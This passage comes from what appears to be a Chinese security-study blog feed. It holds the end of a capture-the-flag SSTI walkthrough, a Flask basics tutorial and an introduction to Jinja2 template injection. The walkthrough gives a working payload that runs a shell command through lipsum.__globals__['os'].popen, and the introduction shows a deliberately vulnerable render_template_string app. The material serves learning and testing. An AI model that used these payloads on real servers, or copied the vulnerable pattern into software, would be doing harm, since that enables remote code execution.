class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">()</span>.__class__<br><span class="hljs-comment">()</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br><span class="hljs-comment">()</span>|attr<span class="hljs-comment">(&quot;__class__&quot;)</span><br><span class="hljs-comment">()</span>.__getattribute__<span class="hljs-comment">(&quot;__class__&quot;)</span><br></code></pre></td></tr></table></figure><hr><h2 id="Level-1-无过滤"><a href="#Level-1-无过滤" class="headerlink" title="Level 1 无过滤"></a>Level 1 无过滤</h2><p>没有任何过滤，直接构造调用lipsum函数的os模块使用popen命令读取flag</p><p>payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="Level-2-双大括号’"><a href="#Level-2-双大括号’" class="headerlink" title="Level 2 双大括号’"></a>Level 2 双大括号’</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask库学习</title>
      <link href="/2025/03/23/Flask%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/23/Flask%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p> Flask是一个非常小的PythonWeb框架，被称为微型框架；只提供了一个稳健的核心，其他功能全部是通过扩展实现的；意思就是我们可以根据项目的需要量身定制，也意味着我们需要学习各种扩展库的使用。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>通过创建路由并关联函数，实现一个基本的网页</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br><span class="hljs-comment"># 用当前脚本名称实例化Flask对象，方便flask从该脚本文件中获取需要的内容</span><br>app = Flask(__name__)<br><br><span class="hljs-comment">#程序实例需要知道每个url请求所对应的运行代码是谁。</span><br><span class="hljs-comment">#所以程序中必须要创建一个url请求地址到python运行函数的一个映射。</span><br><span class="hljs-comment">#处理url和视图函数之间的关系的程序就是&quot;路由&quot;，在Flask中，路由是通过@app.route装饰器(以@开头)来表示的</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-comment">#url映射的函数，要传参则在上述route（路由）中添加参数申明</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World!&quot;</span><br><br><span class="hljs-comment"># 直属的第一个作为视图函数被绑定，第二个就是普通函数</span><br><span class="hljs-comment"># 路由与视图函数需要一一对应</span><br><span class="hljs-comment"># def not():</span><br><span class="hljs-comment">#     return &quot;Not Hello World!&quot;</span><br><br><span class="hljs-comment"># 启动一个本地开发服务器，激活该网页</span><br>app.run()<br></code></pre></td></tr></table></figure><ul><li>**@app.route(‘&#x2F;‘)**： 这是一个装饰器，用于告诉 Flask 哪个 URL 应该触发下面的函数。在这个例子中，它指定了根 URL（即网站的主页）。</li></ul><p>也可以@app.route(‘&#x2F;admin’)&#x2F;@app.route(‘&#x2F;admin&#x2F;admin2’)…</p><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#传参：&lt;变量名&gt;</span><br><span class="hljs-comment">#也可以定义特定的数据类型:&lt;int:变量名&gt;</span><br><span class="hljs-comment">#若传入的是double或str型的则显示not found</span><br><br>路由规则支持不同类型的参数和匹配规则。<br><br>类型规则：<br><br>    字符串（默认）： 匹配任意字符串。<br>    整数（&lt;<span class="hljs-built_in">int</span>:name&gt;）： 匹配整数值。<br>    浮点数（&lt;<span class="hljs-built_in">float</span>:value&gt;）： 匹配浮点数值。<br>    路径（&lt;path:name&gt;）： 匹配任意字符，包括斜杠 /。<br>    <br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/blog/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blog</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;hello <span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><h3 id="请求对象"><a href="#请求对象" class="headerlink" title="请求对象"></a>请求对象</h3><p>请求对象包含了客户端发送的请求信息，包括请求方法、URL、请求头、表单数据等。Flask 提供了 request 对象来访问这些信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/submit&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Hello, <span class="hljs-subst">&#123;username&#125;</span>!&#x27;</span><br></code></pre></td></tr></table></figure><p>request.form.get(‘username’)：获取 POST 请求中表单数据的 username 字段。</p><h3 id="响应对象"><a href="#响应对象" class="headerlink" title="响应对象"></a>响应对象</h3><p>响应对象包含了发送给客户端的响应信息，包括状态码、响应头和响应体。Flask 默认会将字符串、HTML 直接作为响应体。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/custom_response&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_response</span>():<br>  response = make_response(<span class="hljs-string">&#x27;This is a custom response!&#x27;</span>)<br>  response.headers[<span class="hljs-string">&#x27;X-Custom-Header&#x27;</span>] = <span class="hljs-string">&#x27;Value&#x27;</span><br>  <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p><strong>make_response</strong>：创建一个自定义响应对象，并设置响应头 X-Custom-Header。</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><h3 id="普通传参"><a href="#普通传参" class="headerlink" title="普通传参"></a>普通传参</h3><p>Flask 使用 Jinja2 模板引擎来渲染 HTML 模板。模板允许你将 Python 代码嵌入到 HTML 中，从而动态生成网页内容。</p><p>这些html文件都在templates文件夹中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br>//注意导入render_template<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, name=name)//html文件也是可以传参数的<br></code></pre></td></tr></table></figure><p>模板文件hello.html</p><p>&#x2F;&#x2F;模板文件接受py文件传入的参数需用<code>&#123;&#123;&#125;&#125;</code>包裹</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">name</span> &#125;&#125;</span><span class="language-xml">!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="类与字典的传参"><a href="#类与字典的传参" class="headerlink" title="类与字典的传参"></a>类与字典的传参</h3><p>py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template<br>app = Flask(__name__)<br>/类<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>/字典<br>    person = &#123;<br>        <span class="hljs-string">&quot;x&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>: <span class="hljs-string">&quot;yyy&quot;</span><br>    &#125;<br>    stu = student(name=<span class="hljs-string">&quot;fmx&quot;</span>,age=<span class="hljs-string">&quot;18&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;moban_3.html&quot;</span>,stu=stu,person=person)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>moban_3文件</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>fmx<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>你的姓名是</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">stu.name</span>&#125;&#125;</span><span class="language-xml">,年龄是</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">stu.age</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>字典可以这样</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">person</span>[&quot;x&quot;]&#125;&#125;</span><span class="language-xml">，也可以这样</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">person.y</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><p>模板继承允许你创建一个基础模板，然后在其他模板中继承和扩展这个基础模板，避免重复的 HTML 代码。</p><p><strong>创建基础模板</strong>：</p><p>在 templates 文件夹中创建一个基础模板 base.html。</p><p>templates&#x2F;base.html 示例：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> title %&#125;</span><span class="language-xml">My Website</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>My Website<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> content %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Footer content<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong></strong> 和 <strong></strong> 是定义的可替换区域。</p><p><strong>创建子模板</strong>：在 templates 文件夹中创建一个子模板 index.html，继承 base.html。</p><p>templates&#x2F;index.html 文件代码：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">#</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">extends</span></span> &quot;base.html&quot; %&#125;</span><span class="language-xml"> //开头继承</span><br><span class="language-xml"></span><br><span class="language-xml">#</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> title %&#125;</span><span class="language-xml">Home Page</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><span class="language-xml"> //自定义区域</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> content %&#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Welcome to the Home Page!<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Content goes here.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><p>**&lt;!–swig￼32–&gt;**：继承基础模板。</p><p>**</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti模版注入</title>
      <link href="/2025/03/21/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/03/21/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI模版注入漏洞介绍"><a href="#SSTI模版注入漏洞介绍" class="headerlink" title="SSTI模版注入漏洞介绍"></a>SSTI模版注入漏洞介绍</h1><p>SSTI 是 Server-Side Template Injection即 服务端模板注入，它是一种安全漏洞攻击技术。当应用程序在服务器端使用模板引擎来呈现动态生成的内容时，如果用户可以控制模板引擎的输入，就可能导致 SSTI 漏洞。</p><p>在正常情况下，模板引擎被设计用于安全地将预定义的模板与数据进行组合，生成最终的输出。但是，SSTI 漏洞允许攻击者在应用程序的上下文中执行任意的服务器端代码。当攻击者能够通过用户输入或其他外部来源插入恶意的模板代码时，就会产生一系列问题。</p><hr><h2 id="判断模版类型方法"><a href="#判断模版类型方法" class="headerlink" title="判断模版类型方法"></a>判断模版类型方法</h2><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-1.png"></p><p>红线代表未执行，绿线代表执行，跟着这条路去执行指令最终就能判断出使用的模版类型</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-2.png"></p><p>其他各种模版</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-3.png"></p><hr><h1 id="python-jinjia2"><a href="#python-jinjia2" class="headerlink" title="python jinjia2"></a>python jinjia2</h1><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs 0">from importlib.resources import contents<br>import time<br>from flask import Flask,request,render_template_string<br>app = Flask(__name__)<br>@app.route(&#x27;/&#x27;,methods = [&#x27;GET&#x27;])<br>def index():<br>str = request.args.get(&#x27;ben&#x27;)<br>html_str = &#x27;&#x27;&#x27;//str值通过format()函数填充到body中间<br>&lt;html&gt;<br>&lt;head&gt;&lt;/head&gt;<br>&lt;body&gt;&#123;0&#125;&lt;/body&gt;//&#123;&#125;里可以定义任何参数<br>&lt;/html&gt;<br>&#x27;&#x27;&#x27;.format(str)<br>return render_template_string(html_str)//return render_template_string会把&#123;&#125;内的字符串当成代码指令<br>if __name__ == &#x27;__main__&#x27;:<br>app.debug = True<br>app.run(&#x27;127.0.0.1&#x27;,&#x27;8080&#x27;)<br></code></pre></td></tr></table></figure><p>原理：</p><p>这时我们传入<code>?ben=&#123;&#123;7\*7&#125;&#125;，&#123;&#123;7\*7&#125;&#125;</code>会被当成命令执行。所以可以用<code>&#123;&#123;7\*7&#125;&#125;</code>去判断页面存不存在ssti漏洞。</p><p>Jinja2 在渲染的时候会把 <code>&#123;&#123;&#125;&#125;</code> 包裹的内容当做变量解析替换，所以当我们传入 <code>&#123;&#123;表达式&#125;&#125;</code> 时，表达式就会被渲染器执行。而我们随意输入的<code>&#123;&#123;7*7&#125;&#125;</code>也可以用来检验毫无过滤的ssti漏洞</p><p>这里导致漏洞是因为这里是先填充内容再进行模版渲染，所以就会导致我们传入的表达式被执行。</p><h2 id="python继承关系和魔术方法（关键）"><a href="#python继承关系和魔术方法（关键）" class="headerlink" title="python继承关系和魔术方法（关键）"></a>python继承关系和魔术方法（关键）</h2><h3 id="继承关系演示"><a href="#继承关系演示" class="headerlink" title="继承关系演示"></a>继承关系演示</h3><p>父类和子类</p><p>子类调用父类下的其他子类</p><p>Python flask脚本没有办法直接执行python指令</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-4.png"></p><p>代码演示：</p><p>子类（父类）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">A:<span class="hljs-symbol">pass</span></span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">B</span>(<span class="hljs-symbol">A</span>):<span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">C</span>(<span class="hljs-symbol">B</span>):<span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">D</span>(<span class="hljs-symbol">B</span>):<span class="hljs-symbol">pass</span><br><span class="hljs-symbol">c</span> = <span class="hljs-symbol">C</span>()<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__)</span></span><br><span class="hljs-comment">//&lt;class&#x27;__main__.C&#x27;&gt; </span><br>当前类C<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__.__base__)</span></span><br><span class="hljs-comment">//&lt;class&#x27;__main__.B&#x27;&gt;</span><br>当前类C的父类B<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__.__base__.__base__)</span></span><br><span class="hljs-comment">//class&#x27;__main__.A&#x27;&gt;</span><br>父类的父类<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__.__base__.__base__.__base__)</span></span><br><span class="hljs-comment">//class&#x27;object&#x27;&gt;</span><br>层层递进<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__.__mro__)</span></span><br><span class="hljs-comment">//(class&#x27;__main__.C&#x27;&gt;&lt;class&#x27;__main__.B&#x27;&gt;&lt;class&#x27;__main__.A&#x27;&gt;&lt;class&#x27;object&#x27;&gt;)</span><br>罗列所有父类关系C-&gt;B-&gt;A-&gt;<span class="hljs-selector-tag">object</span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__.__base__.__subclasses__()</span></span>)<br><span class="hljs-comment">//[&lt;class&#x27;__main__.C&#x27;&gt;&lt;class&#x27;__main__.D&#x27;&gt;]</span><br>B下的所有子类（数组形式）<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()</span></span>)<br><span class="hljs-comment">//同样是查看B类下有哪些子类</span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c.__class__.__base__.__subclasses__()</span></span><span class="hljs-selector-attr">[1]</span>)<br><span class="hljs-comment">//&lt;class&#x27;__main__.D&#x27;&gt;</span><br>调用子类D <br></code></pre></td></tr></table></figure><hr><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">__class__#查找当前类型的所属对象<br>__base__#沿着父子类的关系往上走一个<br>__mro__#查找当前类对象的所有继承类<br>__subclasses__()#查找父类下的所有子类<br><br>__int__#查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现<span class="hljs-keyword">wrapper</span>字眼，说明没有重载<br>__globals__#函数会以字典的形式返回当前对象的全部全局变量<br></code></pre></td></tr></table></figure><hr><h3 id="检查漏洞"><a href="#检查漏洞" class="headerlink" title="检查漏洞"></a><strong>检查漏洞</strong></h3><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-5.png"></p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-6.png"></p><p><strong>常用注入模块</strong></p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-7.png"></p><hr><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-8.png"></p><h2 id="利用ssti命令执行"><a href="#利用ssti命令执行" class="headerlink" title="利用ssti命令执行"></a>利用ssti命令执行</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">__builtins__提供对Python的所有<span class="hljs-string">&quot;内置&quot;</span>标识符的直接访问<br><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">()</span></span>计算字符串表达式的值<br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span>执行一个shell以运行命令来开启一个进程<br></code></pre></td></tr></table></figure><hr><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 